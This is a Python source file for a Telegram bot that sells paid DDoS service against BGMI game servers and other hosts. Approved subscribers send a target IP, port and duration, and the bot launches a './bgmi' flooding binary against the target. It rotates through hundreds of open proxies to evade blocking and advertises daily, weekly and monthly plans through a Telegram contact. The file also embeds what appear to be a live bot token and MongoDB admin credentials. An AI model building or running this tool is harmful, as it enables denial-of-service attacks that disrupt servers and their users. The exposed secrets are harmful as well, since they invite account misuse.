import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import requests
import telegram
#from telegram import Update
#from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filter
import subprocess



loop = asyncio.get_event_loop()

TOKEN = '7125547027:AAGg-Z1xieIh_ymhWeepxXiWoS_I0wK31z0'
MONGO_URI = 'mongodb+srv://admin:kpR4ObsewTySq48I@test.zeqrmgb.mongodb.net/test_db?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
FORWARD_CHANNEL_ID = -1002187702460
CHANNEL_ID = -1002187702460
error_channel_id = -1002187702460

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['bgmi']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()



def update_proxy():
    proxy_list = ["https://103.159.188.250:80", "https://107.181.161.81:4145", "https://103.13.211.123:3128", "https://103.253.103.50:80", "https://103.46.10.18:7777", "https://103.140.74.200:5678", "https://115.76.199.219:30246", "https://103.234.28.50:9091", "https://152.26.229.83:9443", "https://139.59.1.14:3128", "https://13.80.134.180:80", "https://133.18.234.13:80", "https://144.86.187.42:3129", "https://136.226.230.82:10080", "https://130.185.77.63:80", "https://135.181.154.225:80", "https://177.234.245.242:32213",        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080https://170.80.91.65:4145", "https://178.250.88.254:80", "https://166.0.235.142:62498", "https://172.93.213.177:80", "https://174.77.111.198:49547", "https://174.64.199.79:4145", "https://216.106.1.31:8080", "https://222.167.152.58:8380", "https://198.199.86.11:8080", "https://194.146.43.39:3128", "https://194.156.88.125:2411", "https://195.138.73.54:31145", "https://198.44.255.3:80", "https://195.219.98.27:5678", "https://43.159.30.199:11140", "https://43.134.68.153:3128", "https://43.134.33.254:3128", "https://43.153.208.148:3128", "https://50.62.183.223:80", "https://43.153.207.93:3128", "https://38.10.107.76:20", "https://45.9.75.76:4444", "https://67.43.227.226:28977", "https://67.43.227.226:18185", "https://67.43.227.226:29779", "https://67.43.227.226:11849", "https://67.43.227.226:2213", "https://67.43.227.226:14721", "https://67.43.236.20:14945", "https://72.10.160.170:24791", "https://67.43.228.254:28011", "https://67.43.228.253:20961", "https://67.43.236.20:23085", "https://67.43.236.20:13075", "https://72.10.164.178:18131", "https://72.10.160.173:31761", "https://72.10.160.174:19547", "https://72.10.160.91:21519", "https://72.10.160.90:17469", "https://72.10.164.178:10625", "https://72.10.164.178:19927", "https://72.10.164.178:25619", "https://87.247.186.40:1081", "https://77.83.246.25:80", "https://85.115.112.178:8197", "https://83.68.136.236:80", "https://82.130.202.219:43429", "https://82.137.250.156:4145", "https://85.172.174.3:3128", "https://103.205.128.7:4145", "https://123.103.51.22:3128", "https://103.49.202.252:80", "https://116.99.224.206:24546", "https://103.55.30.22:1111", "https://106.51.62.106:8080", "https://116.103.226.48:3128", "https://104.129.192.170:10878", "https://154.203.132.49:8090", "https://139.59.1.14:8080", "https://152.26.229.86:9443", "https://143.42.114.122:11233", "https://152.26.229.34:9443", "https://137.74.254.242:3128", "https://134.209.114.21:80", "https://14.103.168.150:8088", "https://185.190.38.1:8080", "https://182.127.150.12:8080", "https://178.79.165.164:10798", "https://172.67.167.83:80", "https://177.128.198.26:4153", "https://177.234.192.45:32213", "https://184.185.2.12:4145", "https://217.160.99.39:80", "https://23.247.136.245:80", "https://209.97.150.167:8080", "https://199.102.107.145:4145", "https://35.185.196.38:3128", "https://198.49.68.80:80", "https://23.95.164.200:80", "https://196.51.181.154:8800", "https://46.219.1.5:5678", "https://45.77.98.113:8082", "https://51.91.109.83:80", "https://45.22.209.157:8888", "https://64.202.184.129:5720", "https://47.251.43.115:33333", "https://4.207.204.199:3128", "https://5.161.103.113:80", "https://67.43.227.227:31099", "https://67.43.227.227:21445", "https://67.43.227.226:4769", "https://67.43.227.228:31099", "https://67.43.227.227:28725", "https://67.43.236.20:6371", "https://72.10.160.170:25431", "https://72.10.164.178:15109", "https://72.10.160.91:32309", "https://103.83.232.122:80", "https://123.169.124.203:1080", "https://104.37.135.145:4145", "https://117.68.38.187:29690", "https://125.77.25.178:8080", "https://117.68.38.171:22827", "https://104.248.98.31:3128", "https://141.98.153.86:80", "https://152.26.231.22:9443", "https://15.204.161.192:18080", "https://152.26.229.57:9443", "https://141.145.214.176:80", "https://138.68.60.8:3128", "https://148.72.212.125:46427", "https://185.195.71.218:18080", "https://183.234.215.11:8443", "https://173.249.34.184:3128", "https://178.128.113.118:23128", "https://188.165.49.152:80", "https://25.239.250.168:64135", "https://208.109.14.49:54740", "https://203.162.136.66:80", "https://206.237.98.212:798", "https://47.243.92.199:3128", "https://51.89.14.70:80", "https://45.92.177.60:8080", "https://47.74.152.29:8888", "https://41.65.55.2:1976", "https://51.89.255.67:80", "https://67.43.227.227:32165", "https://67.43.228.252:18309", "https://117.74.65.207:91", "https://107.152.98.5:4145", "https://123.205.24.244:8193", "https://125.77.25.178:8090", "https://123.30.154.171:7777", "https://72.10.164.178:7839", "https://144.86.187.44:3129", "https://159.192.97.129:5678", "https://152.26.229.47:9443", "https://154.73.28.241:8080", "https://143.110.232.177:80", "https://144.86.187.43:3129", "https://149.202.91.219:80", "https://185.232.169.108:4444", "https://185.217.198.121:4444", "https://185.105.91.62:4444", "https://178.48.68.61:18080", "https://188.32.73.98:8081", "https://34.66.141.166:8000", "https://80.249.112.162:80", "https://23.137.248.197:80", "https://203.19.38.114:1080", "https://93.177.67.178:80", "https://209.97.150.167:3128", "https://47.89.184.18:3128", "https://84.39.112.144:3128", "https://50.63.165.21:23859", "https://72.10.160.170:25717", "https://124.41.240.203:37704", "https://91.107.252.136:80", "https://108.181.132.115:48083", "https://67.43.227.228:18185", "https://80.13.43.193:80", "https://152.26.229.42:9443", "https://160.86.242.23:8080", "https://152.26.231.42:9443", "https://159.54.149.67:80", "https://153.101.67.170:9002", "https://152.26.229.88:9443", "https://152.26.229.46:9443", "https://71.19.146.218:80", "https://190.145.182.4:4153", "https://180.31.234.71:8080", "https://192.252.208.67:14287", "https://61.129.2.212:8080", "https://91.232.105.105:16895", "https://125.77.25.177:8090", "https://111.59.4.88:9002", "https://72.10.160.170:29281", "https://51.222.46.79:27676", "https://67.43.227.228:5009", "https://84.93.224.76:8888", "https://84.252.73.132:4444", "https://152.26.229.74:9443", "https://152.26.231.86:9443", "https://162.144.103.99:2654", "https://152.26.231.77:9443", "https://152.26.229.93:9443", "https://47.91.104.88:3128", "https://72.10.160.170:26559", "https://192.252.208.70:14282", "https://182.43.231.63:38080", "https://97.74.87.226:80", "https://43.134.229.98:3128", "https://115.223.31.88:23067", "https://58.147.171.110:8085", "https://94.130.94.45:80", "https://91.247.92.63:5678", "https://156.146.40.7:80", "https://212.8.248.229:11119", "https://61.7.191.58:8080", "https://152.26.231.83:9443", "https://154.16.146.46:80", "https://45.189.252.226:999", "https://116.203.28.43:80", "https://190.103.177.131:80", "https://64.23.223.154:80", "https://154.85.58.149:80", "https://45.65.113.71:80", "https://117.93.72.186:9002", "https://192.111.137.37:18762", "https://152.26.231.93:9443", "https://49.245.96.145:80", "https://162.216.204.146:1080", "https://51.254.78.223:80", "https://123.205.24.244:8380", "https://152.26.231.94:9443", "https://157.254.53.50:80", "https://159.65.245.255:80", "https://5.10.250.177:25796"]proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 60")

    await process.communicate()

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrat.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
            return

        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /attack target_ip target_port time*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("Not Working")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
    elif message.text == "Instant++ Plan 💥":
        bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/FREE_DDOS_BGMI/1335*", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the @SPIDER_DEVELOPER.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.reply_to(message, "*[IP PORT TIME] FOLLOW commands 192.26.26 2663 1*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Bay plan  🤖Day-50 👾weak-300  😈month-700  Bay:- @SPIDER_DEVELOPER*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
